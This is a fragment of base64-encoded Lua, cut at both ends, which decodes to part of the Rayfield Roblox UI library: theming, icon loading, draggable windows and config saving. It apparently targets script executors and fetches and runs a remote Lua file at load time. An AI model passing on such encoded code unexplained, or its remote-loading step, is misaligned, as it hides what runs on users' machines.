9ndWkoUmF5ZmllbGQpCglSYXlmaWVsZC5QYXJlbnQgPSBDb3JlR3VpCmVsc2VpZiBub3QgdXNlU3R1ZGlvIGFuZCBDb3JlR3VpOkZpbmRGaXJzdENoaWxkKCJSb2Jsb3hHdWkiKSB0aGVuCglSYXlmaWVsZC5QYXJlbnQgPSBDb3JlR3VpOkZpbmRGaXJzdENoaWxkKCJSb2Jsb3hHdWkiKQplbHNlaWYgbm90IHVzZVN0dWRpbyB0aGVuCglSYXlmaWVsZC5QYXJlbnQgPSBDb3JlR3VpCmVuZAoKaWYgZ2V0aHVpIHRoZW4KCWZvciBfLCBJbnRlcmZhY2UgaW4gaXBhaXJzKGdldGh1aSgpOkdldENoaWxkcmVuKCkpIGRvCgkJaWYgSW50ZXJmYWNlLk5hbWUgPT0gUmF5ZmllbGQuTmFtZSBhbmQgSW50ZXJmYWNlIH49IFJheWZpZWxkIHRoZW4KCQkJSW50ZXJmYWNlLkVuYWJsZWQgPSBmYWxzZQoJCQlJbnRlcmZhY2UuTmFtZSA9ICJSYXlmaWVsZC1PbGQiCgkJZW5kCgllbmQKZWxzZWlmIG5vdCB1c2VTdHVkaW8gdGhlbgoJZm9yIF8sIEludGVyZmFjZSBpbiBpcGFpcnMoQ29yZUd1aTpHZXRDaGlsZHJlbigpKSBkbwoJCWlmIEludGVyZmFjZS5OYW1lID09IFJheWZpZWxkLk5hbWUgYW5kIEludGVyZmFjZSB+PSBSYXlmaWVsZCB0aGVuCgkJCUludGVyZmFjZS5FbmFibGVkID0gZmFsc2UKCQkJSW50ZXJmYWNlLk5hbWUgPSAiUmF5ZmllbGQtT2xkIgoJCWVuZAoJZW5kCmVuZAoKCmxvY2FsIG1pblNpemUgPSBWZWN0b3IyLm5ldygxMDI0LCA3NjgpCmxvY2FsIHVzZU1vYmlsZVNpemluZwoKaWYgUmF5ZmllbGQuQWJzb2x1dGVTaXplLlggPCBtaW5TaXplLlggYW5kIFJheWZpZWxkLkFic29sdXRlU2l6ZS5ZIDwgbWluU2l6ZS5ZIHRoZW4KCXVzZU1vYmlsZVNpemluZyA9IHRydWUKZW5kCgppZiBVc2VySW5wdXRTZXJ2aWNlLlRvdWNoRW5hYmxlZCB0aGVuCgl1c2VNb2JpbGVQcm9tcHQgPSB0cnVlCmVuZAoKCi0tIE9iamVjdCBWYXJpYWJsZXMKCmxvY2FsIE1haW4gPSBSYXlmaWVsZC5NYWluCmxvY2FsIE1Qcm9tcHQgPSBSYXlmaWVsZDpGaW5kRmlyc3RDaGlsZCgnUHJvbXB0JykKbG9jYWwgVG9wYmFyID0gTWFpbi5Ub3BiYXIKbG9jYWwgRWxlbWVudHMgPSBNYWluLkVsZW1lbnRzCmxvY2FsIExvYWRpbmdGcmFtZSA9IE1haW4uTG9hZGluZ0ZyYW1lCmxvY2FsIFRhYkxpc3QgPSBNYWluLlRhYkxpc3QKbG9jYWwgZHJhZ0JhciA9IFJheWZpZWxkOkZpbmRGaXJzdENoaWxkKCdEcmFnJykKbG9jYWwgZHJhZ0ludGVyYWN0ID0gZHJhZ0JhciBhbmQgZHJhZ0Jhci5JbnRlcmFjdCBvciBuaWwKbG9jYWwgZHJhZ0JhckNvc21ldGljID0gZHJhZ0JhciBhbmQgZHJhZ0Jhci5EcmFnIG9yIG5pbAoKbG9jYWwgZHJhZ09mZnNldCA9IDI1NQpsb2NhbCBkcmFnT2Zmc2V0TW9iaWxlID0gMTUwCgpSYXlmaWVsZC5EaXNwbGF5T3JkZXIgPSAxMDAKTG9hZGluZ0ZyYW1lLlZlcnNpb24uVGV4dCA9IFJlbGVhc2UKCi0tIFRoYW5rcyB0byBMYXR0ZSBTb2Z0d29ya3MgZm9yIHRoZSBMdWNpZGUgaW50ZWdyYXRpb24gZm9yIFJvYmxveApsb2NhbCBJY29ucyA9IHVzZVN0dWRpbyBhbmQgcmVxdWlyZShzY3JpcHQuUGFyZW50Lmljb25zKSBvciBsb2FkV2l0aFRpbWVvdXQoJ2h0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9TaXJpdXNTb2Z0d2FyZUx0ZC9SYXlmaWVsZC9yZWZzL2hlYWRzL21haW4vaWNvbnMubHVhJykKLS0gVmFyaWFibGVzCgpsb2NhbCBDRmlsZU5hbWUgPSBuaWwKbG9jYWwgQ0VuYWJsZWQgPSBmYWxzZQpsb2NhbCBNaW5pbWlzZWQgPSBmYWxzZQpsb2NhbCBIaWRkZW4gPSBmYWxzZQpsb2NhbCBEZWJvdW5jZSA9IGZhbHNlCmxvY2FsIHNlYXJjaE9wZW4gPSBmYWxzZQpsb2NhbCBOb3RpZmljYXRpb25zID0gUmF5ZmllbGQuTm90aWZpY2F0aW9ucwoKbG9jYWwgU2VsZWN0ZWRUaGVtZSA9IFJheWZpZWxkTGlicmFyeS5UaGVtZS5EZWZhdWx0Cgpsb2NhbCBmdW5jdGlvbiBDaGFuZ2VUaGVtZShUaGVtZSkKCWlmIHR5cGVvZihUaGVtZSkgPT0gJ3N0cmluZycgdGhlbgoJCVNlbGVjdGVkVGhlbWUgPSBSYXlmaWVsZExpYnJhcnkuVGhlbWVbVGhlbWVdCgllbHNlaWYgdHlwZW9mKFRoZW1lKSA9PSAndGFibGUnIHRoZW4KCQlTZWxlY3RlZFRoZW1lID0gVGhlbWUKCWVuZAoKCVJheWZpZWxkLk1haW4uQmFja2dyb3VuZENvbG9yMyA9IFNlbGVjdGVkVGhlbWUuQmFja2dyb3VuZAoJUmF5ZmllbGQuTWFpbi5Ub3BiYXIuQmFja2dyb3VuZENvbG9yMyA9IFNlbGVjdGVkVGhlbWUuVG9wYmFyCglSYXlmaWVsZC5NYWluLlRvcGJhci5Db3JuZXJSZXBhaXIuQmFja2dyb3VuZENvbG9yMyA9IFNlbGVjdGVkVGhlbWUuVG9wYmFyCglSYXlmaWVsZC5NYWluLlNoYWRvdy5JbWFnZS5JbWFnZUNvbG9yMyA9IFNlbGVjdGVkVGhlbWUuU2hhZG93CgoJUmF5ZmllbGQuTWFpbi5Ub3BiYXIuQ2hhbmdlU2l6ZS5JbWFnZUNvbG9yMyA9IFNlbGVjdGVkVGhlbWUuVGV4dENvbG9yCglSYXlmaWVsZC5NYWluLlRvcGJhci5IaWRlLkltYWdlQ29sb3IzID0gU2VsZWN0ZWRUaGVtZS5UZXh0Q29sb3IKCVJheWZpZWxkLk1haW4uVG9wYmFyLlNlYXJjaC5JbWFnZUNvbG9yMyA9IFNlbGVjdGVkVGhlbWUuVGV4dENvbG9yCglpZiBUb3BiYXI6RmluZEZpcnN0Q2hpbGQoJ1NldHRpbmdzJykgdGhlbgoJCVJheWZpZWxkLk1haW4uVG9wYmFyLlNldHRpbmdzLkltYWdlQ29sb3IzID0gU2VsZWN0ZWRUaGVtZS5UZXh0Q29sb3IKCQlSYXlmaWVsZC5NYWluLlRvcGJhci5EaXZpZGVyLkJhY2tncm91bmRDb2xvcjMgPSBTZWxlY3RlZFRoZW1lLkVsZW1lbnRTdHJva2UKCWVuZAoKCU1haW4uU2VhcmNoLkJhY2tncm91bmRDb2xvcjMgPSBTZWxlY3RlZFRoZW1lLlRleHRDb2xvcgoJTWFpbi5TZWFyY2guU2hhZG93LkltYWdlQ29sb3IzID0gU2VsZWN0ZWRUaGVtZS5UZXh0Q29sb3IKCU1haW4uU2VhcmNoLlNlYXJjaC5JbWFnZUNvbG9yMyA9IFNlbGVjdGVkVGhlbWUuVGV4dENvbG9yCglNYWluLlNlYXJjaC5JbnB1dC5QbGFjZWhvbGRlckNvbG9yMyA9IFNlbGVjdGVkVGhlbWUuVGV4dENvbG9yCglNYWluLlNlYXJjaC5VSVN0cm9rZS5Db2xvciA9IFNlbGVjdGVkVGhlbWUuU2Vjb25kYXJ5RWxlbWVudFN0cm9rZQoKCWlmIE1haW46RmluZEZpcnN0Q2hpbGQoJ05vdGljZScpIHRoZW4KCQlNYWluLk5vdGljZS5CYWNrZ3JvdW5kQ29sb3IzID0gU2VsZWN0ZWRUaGVtZS5CYWNrZ3JvdW5kCgllbmQKCglmb3IgXywgdGV4dCBpbiBpcGFpcnMoUmF5ZmllbGQ6R2V0RGVzY2VuZGFudHMoKSkgZG8KCQlpZiB0ZXh0LlBhcmVudC5QYXJlbnQgfj0gTm90aWZpY2F0aW9ucyB0aGVuCgkJCWlmIHRleHQ6SXNBKCdUZXh0TGFiZWwnKSBvciB0ZXh0OklzQSgnVGV4dEJveCcpIHRoZW4gdGV4dC5UZXh0Q29sb3IzID0gU2VsZWN0ZWRUaGVtZS5UZXh0Q29sb3IgZW5kCgkJZW5kCgllbmQKCglmb3IgXywgVGFiUGFnZSBpbiBpcGFpcnMoRWxlbWVudHM6R2V0Q2hpbGRyZW4oKSkgZG8KCQlmb3IgXywgRWxlbWVudCBpbiBpcGFpcnMoVGFiUGFnZTpHZXRDaGlsZHJlbigpKSBkbwoJCQlpZiBFbGVtZW50LkNsYXNzTmFtZSA9PSAiRnJhbWUiIGFuZCBFbGVtZW50Lk5hbWUgfj0gIlBsYWNlaG9sZGVyIiBhbmQgRWxlbWVudC5OYW1lIH49ICJTZWN0aW9uU3BhY2luZyIgYW5kIEVsZW1lbnQuTmFtZSB+PSAiRGl2aWRlciIgYW5kIEVsZW1lbnQuTmFtZSB+PSAiU2VjdGlvblRpdGxlIiBhbmQgRWxlbWVudC5OYW1lIH49ICJTZWFyY2hUaXRsZS1mc2Vmc2VmZXNmc2VmZXNmZXNmVGhhbmtzIiB0aGVuCgkJCQlFbGVtZW50LkJhY2tncm91bmRDb2xvcjMgPSBTZWxlY3RlZFRoZW1lLkVsZW1lbnRCYWNrZ3JvdW5kCgkJCQlFbGVtZW50LlVJU3Ryb2tlLkNvbG9yID0gU2VsZWN0ZWRUaGVtZS5FbGVtZW50U3Ryb2tlCgkJCWVuZAoJCWVuZAoJZW5kCmVuZAoKbG9jYWwgZnVuY3Rpb24gZ2V0SWNvbihuYW1lIDogc3RyaW5nKToge2lkOiBudW1iZXIsIGltYWdlUmVjdFNpemU6IFZlY3RvcjIsIGltYWdlUmVjdE9mZnNldDogVmVjdG9yMn0KCWlmIG5vdCBJY29ucyB0aGVuCgkJd2FybigiTHVjaWRlIEljb25zOiBDYW5ub3QgdXNlIGljb25zIGFzIGljb25zIGxpYnJhcnkgaXMgbm90IGxvYWRlZCIpCgkJcmV0dXJuCgllbmQKCW5hbWUgPSBzdHJpbmcubWF0Y2goc3RyaW5nLmxvd2VyKG5hbWUpLCAiXiVzKiguKiklcyokIikgOjogc3RyaW5nCglsb2NhbCBzaXplZGljb25zID0gSWNvbnNbJzQ4cHgnXQoJbG9jYWwgciA9IHNpemVkaWNvbnNbbmFtZV0KCWlmIG5vdCByIHRoZW4KCQllcnJvcihgTHVjaWRlIEljb25zOiBGYWlsZWQgdG8gZmluZCBpY29uIGJ5IHRoZSBuYW1lIG9mICJ7bmFtZX0iYCwgMikKCWVuZAoKCWxvY2FsIHJpcnMgPSByWzJdCglsb2NhbCByaXJvID0gclszXQoKCWlmIHR5cGUoclsxXSkgfj0gIm51bWJlciIgb3IgdHlwZShyaXJzKSB+PSAidGFibGUiIG9yIHR5cGUocmlybykgfj0gInRhYmxlIiB0aGVuCgkJZXJyb3IoIkx1Y2lkZSBJY29uczogSW50ZXJuYWwgZXJyb3I6IEludmFsaWQgYXV0by1nZW5lcmF0ZWQgYXNzZXQgZW50cnkiKQoJZW5kCgoJbG9jYWwgaXJzID0gVmVjdG9yMi5uZXcocmlyc1sxXSwgcmlyc1syXSkKCWxvY2FsIGlybyA9IFZlY3RvcjIubmV3KHJpcm9bMV0sIHJpcm9bMl0pCgoJbG9jYWwgYXNzZXQgPSB7CgkJaWQgPSByWzFdLAoJCWltYWdlUmVjdFNpemUgPSBpcnMsCgkJaW1hZ2VSZWN0T2Zmc2V0ID0gaXJvLAoJfQoKCXJldHVybiBhc3NldAplbmQKLS0gQ29udmVydHMgSUQgdG8gYXNzZXQgVVJJLiBSZXR1cm5zIHJieGFzc2V0aWQ6Ly8wIGlmIElEIGlzIG5vdCBhIG51bWJlcgpsb2NhbCBmdW5jdGlvbiBnZXRBc3NldFVyaShpZDogYW55KTogc3RyaW5nCglsb2NhbCBhc3NldFVyaSA9ICJyYnhhc3NldGlkOi8vMCIgLS0gRGVmYXVsdCB0byBlbXB0eSBpbWFnZQoJaWYgdHlwZShpZCkgPT0gIm51bWJlciIgdGhlbgoJCWFzc2V0VXJpID0gInJieGFzc2V0aWQ6Ly8iIC4uIGlkCgllbHNlaWYgdHlwZShpZCkgPT0gInN0cmluZyIgYW5kIG5vdCBJY29ucyB0aGVuCgkJd2FybigiUmF5ZmllbGQgfCBDYW5ub3QgdXNlIEx1Y2lkZSBpY29ucyBhcyBpY29ucyBsaWJyYXJ5IGlzIG5vdCBsb2FkZWQiKQoJZWxzZQoJCXdhcm4oIlJheWZpZWxkIHwgVGhlIGljb24gYXJndW1lbnQgbXVzdCBlaXRoZXIgYmUgYW4gaWNvbiBJRCAobnVtYmVyKSBvciBhIEx1Y2lkZSBpY29uIG5hbWUgKHN0cmluZykiKQoJZW5kCglyZXR1cm4gYXNzZXRVcmkKZW5kCgpsb2NhbCBmdW5jdGlvbiBtYWtlRHJhZ2dhYmxlKG9iamVjdCwgZHJhZ09iamVjdCwgZW5hYmxlVGFwdGljLCB0YXB0aWNPZmZzZXQpCglsb2NhbCBkcmFnZ2luZyA9IGZhbHNlCglsb2NhbCByZWxhdGl2ZSA9IG5pbAoKCWxvY2FsIG9mZnNldCA9IFZlY3RvcjIuemVybwoJbG9jYWwgc2NyZWVuR3VpID0gb2JqZWN0OkZpbmRGaXJzdEFuY2VzdG9yV2hpY2hJc0EoIlNjcmVlbkd1aSIpCglpZiBzY3JlZW5HdWkgYW5kIHNjcmVlbkd1aS5JZ25vcmVHdWlJbnNldCB0aGVuCgkJb2Zmc2V0ICs9IGdldFNlcnZpY2UoJ0d1aVNlcnZpY2UnKTpHZXRHdWlJbnNldCgpCgllbmQKCglsb2NhbCBmdW5jdGlvbiBjb25uZWN0RnVuY3Rpb25zKCkKCQlpZiBkcmFnQmFyIGFuZCBlbmFibGVUYXB0aWMgdGhlbgoJCQlkcmFnQmFyLk1vdXNlRW50ZXI6Q29ubmVjdChmdW5jdGlvbigpCgkJCQlpZiBub3QgZHJhZ2dpbmcgYW5kIG5vdCBIaWRkZW4gdGhlbgoJCQkJCVR3ZWVuU2VydmljZTpDcmVhdGUoZHJhZ0JhckNvc21ldGljLCBUd2VlbkluZm8ubmV3KDAuMjUsIEVudW0uRWFzaW5nU3R5bGUuQmFjaywgRW51bS5FYXNpbmdEaXJlY3Rpb24uT3V0KSwge0JhY2tncm91bmRUcmFuc3BhcmVuY3kgPSAwLjUsIFNpemUgPSBVRGltMi5uZXcoMCwgMTIwLCAwLCA0KX0pOlBsYXkoKQoJCQkJZW5kCgkJCWVuZCkKCgkJCWRyYWdCYXIuTW91c2VMZWF2ZTpDb25uZWN0KGZ1bmN0aW9uKCkKCQkJCWlmIG5vdCBkcmFnZ2luZyBhbmQgbm90IEhpZGRlbiB0aGVuCgkJCQkJVHdlZW5TZXJ2aWNlOkNyZWF0ZShkcmFnQmFyQ29zbWV0aWMsIFR3ZWVuSW5mby5uZXcoMC4yNSwgRW51bS5FYXNpbmdTdHlsZS5CYWNrLCBFbnVtLkVhc2luZ0RpcmVjdGlvbi5PdXQpLCB7QmFja2dyb3VuZFRyYW5zcGFyZW5jeSA9IDAuNywgU2l6ZSA9IFVEaW0yLm5ldygwLCAxMDAsIDAsIDQpfSk6UGxheSgpCgkJCQllbmQKCQkJZW5kKQoJCWVuZAoJZW5kCgoJY29ubmVjdEZ1bmN0aW9ucygpCgoJZHJhZ09iamVjdC5JbnB1dEJlZ2FuOkNvbm5lY3QoZnVuY3Rpb24oaW5wdXQsIHByb2Nlc3NlZCkKCQlpZiBwcm9jZXNzZWQgdGhlbiByZXR1cm4gZW5kCgoJCWxvY2FsIGlucHV0VHlwZSA9IGlucHV0LlVzZXJJbnB1dFR5cGUuTmFtZQoJCWlmIGlucHV0VHlwZSA9PSAiTW91c2VCdXR0b24xIiBvciBpbnB1dFR5cGUgPT0gIlRvdWNoIiB0aGVuCgkJCWRyYWdnaW5nID0gdHJ1ZQoKCQkJcmVsYXRpdmUgPSBvYmplY3QuQWJzb2x1dGVQb3NpdGlvbiArIG9iamVjdC5BYnNvbHV0ZVNpemUgKiBvYmplY3QuQW5jaG9yUG9pbnQgLSBVc2VySW5wdXRTZXJ2aWNlOkdldE1vdXNlTG9jYXRpb24oKQoJCQlpZiBlbmFibGVUYXB0aWMgYW5kIG5vdCBIaWRkZW4gdGhlbgoJCQkJVHdlZW5TZXJ2aWNlOkNyZWF0ZShkcmFnQmFyQ29zbWV0aWMsIFR3ZWVuSW5mby5uZXcoMC4zNSwgRW51bS5FYXNpbmdTdHlsZS5CYWNrLCBFbnVtLkVhc2luZ0RpcmVjdGlvbi5PdXQpLCB7U2l6ZSA9IFVEaW0yLm5ldygwLCAxMTAsIDAsIDQpLCBCYWNrZ3JvdW5kVHJhbnNwYXJlbmN5ID0gMH0pOlBsYXkoKQoJCQllbmQKCQllbmQKCWVuZCkKCglsb2NhbCBpbnB1dEVuZGVkID0gVXNlcklucHV0U2VydmljZS5JbnB1dEVuZGVkOkNvbm5lY3QoZnVuY3Rpb24oaW5wdXQpCgkJaWYgbm90IGRyYWdnaW5nIHRoZW4gcmV0dXJuIGVuZAoKCQlsb2NhbCBpbnB1dFR5cGUgPSBpbnB1dC5Vc2VySW5wdXRUeXBlLk5hbWUKCQlpZiBpbnB1dFR5cGUgPT0gIk1vdXNlQnV0dG9uMSIgb3IgaW5wdXRUeXBlID09ICJUb3VjaCIgdGhlbgoJCQlkcmFnZ2luZyA9IGZhbHNlCgoJCQljb25uZWN0RnVuY3Rpb25zKCkKCgkJCWlmIGVuYWJsZVRhcHRpYyBhbmQgbm90IEhpZGRlbiB0aGVuCgkJCQlUd2VlblNlcnZpY2U6Q3JlYXRlKGRyYWdCYXJDb3NtZXRpYywgVHdlZW5JbmZvLm5ldygwLjM1LCBFbnVtLkVhc2luZ1N0eWxlLkJhY2ssIEVudW0uRWFzaW5nRGlyZWN0aW9uLk91dCksIHtTaXplID0gVURpbTIubmV3KDAsIDEwMCwgMCwgNCksIEJhY2tncm91bmRUcmFuc3BhcmVuY3kgPSAwLjd9KTpQbGF5KCkKCQkJZW5kCgkJZW5kCgllbmQpCgoJbG9jYWwgcmVuZGVyU3RlcHBlZCA9IFJ1blNlcnZpY2UuUmVuZGVyU3RlcHBlZDpDb25uZWN0KGZ1bmN0aW9uKCkKCQlpZiBkcmFnZ2luZyBhbmQgbm90IEhpZGRlbiB0aGVuCgkJCWxvY2FsIHBvc2l0aW9uID0gVXNlcklucHV0U2VydmljZTpHZXRNb3VzZUxvY2F0aW9uKCkgKyByZWxhdGl2ZSArIG9mZnNldAoJCQlpZiBlbmFibGVUYXB0aWMgYW5kIHRhcHRpY09mZnNldCB0aGVuCgkJCQlUd2VlblNlcnZpY2U6Q3JlYXRlKG9iamVjdCwgVHdlZW5JbmZvLm5ldygwLjQsIEVudW0uRWFzaW5nU3R5bGUuRXhwb25lbnRpYWwsIEVudW0uRWFzaW5nRGlyZWN0aW9uLk91dCksIHtQb3NpdGlvbiA9IFVEaW0yLmZyb21PZmZzZXQocG9zaXRpb24uWCwgcG9zaXRpb24uWSl9KTpQbGF5KCkKCQkJCVR3ZWVuU2VydmljZTpDcmVhdGUoZHJhZ09iamVjdC5QYXJlbnQsIFR3ZWVuSW5mby5uZXcoMC4wNSwgRW51bS5FYXNpbmdTdHlsZS5FeHBvbmVudGlhbCwgRW51bS5FYXNpbmdEaXJlY3Rpb24uT3V0KSwge1Bvc2l0aW9uID0gVURpbTIuZnJvbU9mZnNldChwb3NpdGlvbi5YLCBwb3NpdGlvbi5ZICsgKCh1c2VNb2JpbGVTaXppbmcgYW5kIHRhcHRpY09mZnNldFsyXSkgb3IgdGFwdGljT2Zmc2V0WzFdKSl9KTpQbGF5KCkKCQkJZWxzZQoJCQkJaWYgZHJhZ0JhciBhbmQgdGFwdGljT2Zmc2V0IHRoZW4KCQkJCQlkcmFnQmFyLlBvc2l0aW9uID0gVURpbTIuZnJvbU9mZnNldChwb3NpdGlvbi5YLCBwb3NpdGlvbi5ZICsgKCh1c2VNb2JpbGVTaXppbmcgYW5kIHRhcHRpY09mZnNldFsyXSkgb3IgdGFwdGljT2Zmc2V0WzFdKSkKCQkJCWVuZAoJCQkJb2JqZWN0LlBvc2l0aW9uID0gVURpbTIuZnJvbU9mZnNldChwb3NpdGlvbi5YLCBwb3NpdGlvbi5ZKQoJCQllbmQKCQllbmQKCWVuZCkKCglvYmplY3QuRGVzdHJveWluZzpDb25uZWN0KGZ1bmN0aW9uKCkKCQlpZiBpbnB1dEVuZGVkIHRoZW4gaW5wdXRFbmRlZDpEaXNjb25uZWN0KCkgZW5kCgkJaWYgcmVuZGVyU3RlcHBlZCB0aGVuIHJlbmRlclN0ZXBwZWQ6RGlzY29ubmVjdCgpIGVuZAoJZW5kKQplbmQKCgpsb2NhbCBmdW5jdGlvbiBQYWNrQ29sb3IoQ29sb3IpCglyZXR1cm4ge1IgPSBDb2xvci5SICogMjU1LCBHID0gQ29sb3IuRyAqIDI1NSwgQiA9IENvbG9yLkIgKiAyNTV9CmVuZCAgICAKCmxvY2FsIGZ1bmN0aW9uIFVucGFja0NvbG9yKENvbG9yKQoJcmV0dXJuIENvbG9yMy5mcm9tUkdCKENvbG9yLlIsIENvbG9yLkcsIENvbG9yLkIpCmVuZAoKbG9jYWwgZnVuY3Rpb24gTG9hZENvbmZpZ3VyYXRpb24oQ29uZmlndXJhdGlvbikKCWxvY2FsIHN1Y2Nlc3MsIERhdGEgPSBwY2FsbChmdW5jdGlvbigpIHJldHVybiBIdHRwU2VydmljZTpKU09ORGVjb2RlKENvbmZpZ3VyYXRpb24pIGVuZCkKCWxvY2FsIGNoYW5nZWQKCglpZiBub3Qgc3VjY2VzcyB0aGVuIHdhcm4oJ1JheWZpZWxkIGhhZCBhbiBpc3N1ZSBkZWNvZGluZyB0aGUgY29uZmlndXJhdGlvbiBmaWxlLCBwbGVhc2UgdHJ5IGRlbGV0ZSB0aGUgZmlsZSBhbmQgcmVvcGVuIFJheWZpZWxkLicpIHJldHVybiBlbmQKCgktLSBJdGVyYXRlIHRocm91Z2ggY3VycmVudCBVSSBlbGVtZW50cycgZmxhZ3MKCWZvciBGbGFnTmFtZSwgRmxhZyBpbiBwYWlycyhSYXlmaWVsZExpYnJhcnkuRmxhZ3MpIGRvCgkJbG9jYWwgRmxhZ1ZhbHVlID0gRGF0YVtGbGFnTmFtZV0KCgkJaWYgKHR5cGVvZihGbGFnVmFsdWUpID09ICdib29sZWFuJyBhbmQgRmxhZ1ZhbHVlID09IGZhbHNlKSBvciBGbGFnVmFsdWUgdGhlbgoJCQl0YXNrLnNwYXduKGZ1bmN0aW9uKCkKCQkJCWlmIEZsYWcuVHlwZSA9PSAiQ29sb3JQaWNrZXIiIHRoZW4KCQkJCQljaGFuZ2VkID0gdHJ1ZQoJCQkJCUZsYWc6U2V0KFVucGFja0NvbG9yKEZsYWdWYWx1ZSkpCgkJCQllbHNlCgkJCQkJaWYgKEZsYWcuQ3VycmVudFZhbHVlIG9yIEZsYWcuQ3VycmVudEtleWJpbmQgb3IgRmxhZy5DdXJyZW50T3B0aW9uIG9yIEZsYWcuQ29sb3IpIH49IEZsYWdWYWx1ZSB0aGVuIAoJCQkJCQljaGFuZ2VkID0gdHJ1ZQoJCQkJCQlGbGFnOlNldChGbGFnVmFsdWUpIAkKCQkJCQllbmQKCQkJCWVuZAoJCQllbmQpCgkJZWxzZQoJCQl3YXJuKCJSYXlmaWVsZCB8IFVuYWJsZSB0byBmaW5kICciLi5GbGFnTmFtZS4uICInIGluIHRoZSBzYXZlIGZpbGUuIikKCQkJcHJpbnQoIlRoZSBlcnJvciBhYm92ZSBtYXkgbm90IGJlIGFuIGlzc3VlIGlmIG5ldyBlbGVtZW50cyBoYXZlIGJlZW4gYWRkZWQgb3Igbm90IGJlZW4gc2V0IHZhbHVlcy4iKQoJCQktLVJheWZpZWxkTGlicmFyeTpOb3RpZnkoe1RpdGxlID0gIlJheWZpZWxkIEZsYWdzIiwgQ29udGVudCA9ICJSYXlmaWVsZCB3YXMgdW5hYmxlIHRvIGZpbmQgJyIuLkZsYWdOYW1lLi4gIicgaW4gdGhlIHNhdmUgZmlsZS4gQ2hlY2sgc2lyaXVzLm1lbnUvZGlzY29yZCBmb3IgaGVscC4iLCBJbWFnZSA9IDM5NDQ2ODgzOTh9KQoJCWVuZAoJZW5kCgoJcmV0dXJuIGNoYW5nZWQKZW5kCgpsb2NhbCBmdW5jdGlvbiBTYXZlQ29uZmlndXJhdGlvbigpCglpZiBub3QgQ0VuYWJsZWQgb3Igbm90IGdsb2JhbExvYWRlZCB0aGVuIHJldHVybiBlbmQKCglpZiBkZWJ1Z1ggdGhlbgoJCXByaW50KCdTYXZpbmcnKQoJZW5kCgoJbG9jYWwgRGF0YSA9IHt9Cglmb3IgaSwgdiBpbiBwYWlycyhSYXlmaWVsZExpYnJhcnkuRmxhZ3MpIGRvCgkJaWYgdi5UeXBlID09ICJDb2xvclBpY2tlciIgdGhlbgoJCQlEYXRhW2ldID0gUGFja0NvbG9yKHYuQ29sb3IpCgkJZWxzZQoJCQlpZiB0eXBlb2Yodi5DdXJyZW50VmFsdWUpID09ICdib29sZWFuJyB0aGVuCgkJCQlpZiB2LkN1cnJlbnRWYWx1ZSA9PSBmYWxzZSB0aGVuCgkJCQkJRGF0YVtpXSA9IGZhbHNlCgkJCQllbHNlCgkJCQkJRGF0YVtpXSA9IHYuQ3VycmVudFZhbHVlIG9yIHYuQ3VycmVudEtleWJpbmQgb3Igdi5DdXJyZW50T3B0aW9uIG9yIHYuQ29sb3IKCQkJCWVuZAoJCQllbHNlCgkJCQlEYXRhW2ldID0gdi5DdXJyZW50VmFsdWUgb3Igdi5DdXJyZW50S2V5YmluZCBvciB2LkN1cnJlbnRPcHRpb24gb3Igdi5Db2xvcgoJCQllbmQKCQllbmQKCWVuZAoKCWlmIHVzZVN0dWRpbyB0aGVuCgkJaWYgc2NyaXB0LlBhcmVudDpGaW5kRmlyc3RDaGlsZCgnY29uZmlndXJhdGlvbicpIHRoZW4gc2NyaXB0LlBhcmVudC5jb25maWd1cmF0aW9uOkRlc3Ryb3koKSBlbmQKCgkJbG9jYWwgU2NyZWVuR3VpID0gSW5zdGFuY2UubmV3KCJTY3JlZW5HdWkiKQoJCVNjcmVlbkd1aS5QYXJlbnQgPSBzY3JpcHQuUGFyZW50CgkJU2NyZWVuR3VpLk5hbWUgPSAnY29uZmlndXJhdGlvbicKCgkJbG9jYWwgVGV4dEJveCA9IEluc3RhbmNlLm5ldygiVGV4dEJveCIpCgkJVGV4dEJveC5QYXJlbnQgPSBTY3JlZW5HdWkKCQlUZXh0Qm94LlNpemUgPSBVRGltMi5uZXcoMCwgODAwLCAwLCA1MCkKCQlUZXh0Qm94LkFuY2hvclBvaW50ID0gVmVjdG9yMi5uZXcoMC41LCAwKQoJCVRleHRCb3guUG9zaXRpb24gPSBVRGltMi5uZXcoMC41LCAwLCAwLCAzMCkKCQlUZXh0Qm94LlRleHQgPSBIdHRwU2VydmljZTpKU09ORW5jb2RlKERhdGEpCgkJVGV4dEJveC5DbGVhclRleHRPbkZvY3VzID0gZmFsc2UKCWVuZAoKCWlmIGRlYnVnWCB0aGVuCgkJd2FybihIdHRwU2VydmljZTpKU09ORW5jb2RlKERhdGEpKQoJZW5kCgoJaWYgd3JpdGVmaWxlIHRoZW4KCQl3cml0ZWZpbGUoQ29uZmlndXJhdGlvbkZvbGRlciAuLiAiLyIgLi4gQ0ZpbGVOYW1lIC4uIENvbmZpZ3VyYXRpb25FeHRlbnNpb24sIHRvc3RyaW5nKEh0dHBTZXJ2aWNlOkpTT05FbmNvZGUoRGF0YSkpKQoJZW5kCmVuZAoKZnVuY3Rpb24gUmF5ZmllbGRMaWJyYXJ5Ok5vdGlmeShkYXRhKSAtLSBhY3Rpb24gZS5nIG9wZW4gbWVzc2FnZXMKCXRhc2suc3Bhd24oZnVuY3Rpb24oKQoKCQktLSBOb3RpZmljYXRpb24gT2JqZWN0IENyZWF0aW9uCgkJbG9jYWwgbmV3Tm90aWZpY2F0aW9uID0gTm90aWZpY2F0aW9ucy5UZW1wbGF0ZTpDbG9uZSgpCgkJbmV3Tm90aWZpY2F0aW9uLk5hbWUgPSBkYXRhLlRpdGxlIG9yICdObyBUaXRsZSBQcm92aWRlZCcKCQluZXdOb3RpZmljYXRpb24uUGFyZW50ID0gTm90aWZpY2F0aW9ucwoJCW5ld05vdGlmaWNhdGlvbi5MYXlvdXRPcmRlciA9ICNOb3RpZmljYXRpb25zOkdldENoaWxkcmVuKCkKCQluZXdOb3RpZmljYXRpb24uVmlzaWJsZSA9IGZhbHNlCgoJCS0tIFNldCBEYXRhCgkJbmV3Tm90aWZpY2F0aW9uLlRpdGxlLlRleHQgPSBkYXRhLlRpdGxlIG9yICJVbmtub3duIFRpdGxlIgoJCW5ld05vdGlmaWNhdGlvbi5EZXNjcmlwdGlvbi5UZXh0ID0gZGF0YS5Db250ZW50IG9yICJVbmtub3duIENvbnRlbnQiCgoJCWlmIGRhdGEuSW1hZ2UgdGhlbgoJCQlpZiB0eXBlb2YoZGF0YS5JbWFnZSkgPT0gJ3N0cmluZycgYW5kIEljb25zIHRoZW4KCQkJCWxvY2FsIGFzc2V0ID0gZ2V0SWNvbihkYXRhLkltYWdlKQoKCQkJCW5ld05vdGlmaWNhdGlvbi5JY29uLk